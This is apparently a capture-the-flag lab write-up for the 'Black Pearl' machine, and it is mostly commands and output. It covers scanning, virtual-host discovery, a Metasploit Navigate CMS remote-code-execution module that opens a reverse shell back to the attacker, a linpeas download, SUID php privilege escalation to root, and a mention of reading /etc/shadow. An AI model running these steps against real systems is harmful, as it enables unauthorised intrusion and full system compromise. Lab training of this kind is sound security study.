# Black Pearl

<aside>
💡 Machine IP = 172.16.2.131

</aside>

# Scanning And enumeration:

Starting off with the nmap scan

```jsx
nmap -T4 -A -p- 172.16.2.131  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-30 15:27 PKT
Nmap scan report for 172.16.2.131
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66381450ae7dab3972bf419c39251a0f (RSA)
|   256 a62e7771c6496fd573e9227d8b1ca9c6 (ECDSA)
|_  256 890b73c153c8e1885ec316ded1e5260d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
MAC Address: 00:0C:29:E5:3C:FA (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/30%OT=22%CT=1%CU=44222%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=64C63B20%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=100%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 172.16.2.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.67 seconds
```

Lets try to FUZZ this with ffuf since the webpage is just default. Although there is one thing in the Page source, the webmaster email

![Untitled](Black%20Pearl%2010190bcd227848af9a116b42cbf3fa46/Untitled.png)

```jsx
──(root㉿wahaj)-[/home/wahaj]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://172.16.2.131/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.2.131/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 1ms]
                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 1ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 1ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 4ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 5ms]
# on atleast 2 different hosts [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 6ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 7ms]
# Copyright 2007 James Fisher [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 7ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 8ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 8ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 9ms]
#                       [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 201ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 206ms]
secret                  [Status: 200, Size: 209, Words: 31, Lines: 9, Duration: 3ms]
                        [Status: 200, Size: 652, Words: 82, Lines: 27, Duration: 2ms]
:: Progress: [220560/220560] :: Job [1/1] :: 15705 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

<aside>
💡 There is a directory called secret, lets see whats there. As i searched it, it downloads us a file called secret. Lets see whats inside.

</aside>

```jsx
┌──(root㉿wahaj)-[/home/wahaj/Downloads]
└─# cat secret  
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek
```

Well that was a dead end.

<aside>
💡 Lets perform a DNS recon to see if there is something useful there.

</aside>

```jsx
┌──(root㉿wahaj)-[/home/wahaj/Downloads]
└─# dnsrecon -r 127.0.0.0/24 -n 172.16.2.131 -d wahaj
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```

<aside>
💡 Now add the following line into your /etc/hosts

</aside>

```jsx
172.16.2.131    blackpearl.tcm
```

<aside>
💡 Now if you go back to your browser and type
http://blackpearl.tcm , the phpinfo page shows up

</aside>

![Untitled](Black%20Pearl%2010190bcd227848af9a116b42cbf3fa46/Untitled%201.png)

Lets try directory busting again

```jsx
┌──(root㉿wahaj)-[/home/wahaj/Downloads]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://blackpearl.tcm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 6ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 11ms]
# on atleast 2 different hosts [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 18ms]
#                       [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 21ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 26ms]
#                       [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 31ms]
# Copyright 2007 James Fisher [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 34ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 203ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86800, Words: 4215, Lines: 1040, Duration: 209ms]
#                       [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 217ms]
                        [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 223ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 230ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 232ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 235ms]
navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 2ms]
                        [Status: 200, Size: 86801, Words: 4215, Lines: 1040, Duration: 4ms]
:: Progress: [220560/220560] :: Job [1/1] :: 21024 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

<aside>
💡 A potential navigate directory, lets see whats there

</aside>

![Untitled](Black%20Pearl%2010190bcd227848af9a116b42cbf3fa46/Untitled%202.png)

<aside>
💡 Lets see if there are any exploits availaible on the internet
search navigate cms exploits

</aside>

```jsx
https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
```

<aside>
💡 And we have an exploit that runs without authentication, we are getting there. Jump into metasploit and about time we broke this box.

</aside>

```jsx
┌──(root㉿wahaj)-[/home/wahaj/Downloads]
└─# msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|

       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE 
true                                                                                                                                                          
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/http/navigate_cms_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 172.16.2.131
rhosts => 172.16.2.131
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm'
[-] Parse error: Unmatched quote: "set vhost blackpearl.tcm'"
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
vhost => blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > run

[*] Started reverse TCP handler on 192.168.1.107:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 192.168.1.107
[*] Meterpreter session 1 opened (192.168.1.107:4444 -> 192.168.1.107:52447) at 2023-07-30 16:03:26 +0500

meterpreter > shell
Process 926 created.
Channel 2 created.
whoami
www-data
sudo -l
/bin/sh: 2: sudo: not found
```

<aside>
💡 Well, we dont have sudo but we got into the www-data user.

</aside>

Lets spawn a tty shell first

```jsx
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@blackpearl:~/blackpearl.tcm/navigate$
```

We need privilege escalation so lets try on linpeas.

```jsx
┌──(wahaj㉿wahaj)-[~]
└─$ cd /transfers 
                                                                                                                                                               
┌──(wahaj㉿wahaj)-[/transfers]
└─$ ls
linpeas.sh  pspy64  reverse-shell.php
                                                                                                                                                               
                                                                                                                                                               
┌──(wahaj㉿wahaj)-[/transfers]
└─$ sudo python3 -m http.server 80
[sudo] password for wahaj: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

<aside>
💡 Download the [linpeas.sh](http://linpeas.sh) file in the machine.

</aside>

```jsx
chmod +x linpeas.sh
./linpeas.sh
```

<aside>
💡 Scrolling through, there is one directory standing out, lets keep it
rwxr-xr-x 1 www-data www-data 12282 May 30 2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backups.php

</aside>

Some more interesting files

```jsx
====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/chsh
/usr/bin/gpasswd
```

<aside>
💡 There are s permissions which means that we can run them as the root who is the owner

</aside>

<aside>
💡 Another way to find these SUID files is by the command

</aside>

```jsx
www-data@blackpearl:/tmp$ find / -type f -perm -4000 2>/dev/null   
find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
www-data@blackpearl:/tmp$
```

<aside>
💡 This is good, we can go to GTFO bins and check for SUID shells. and we will check the
SUID part and check if any of the netries from the list exist here, and we do have php.

</aside>

```jsx
www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
```

<aside>
💡 And boom, we have root

</aside>

cat the flag and we are done.

```jsx
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
#
```

```jsx
To confirm access, we can actually cat /etc/shadow
```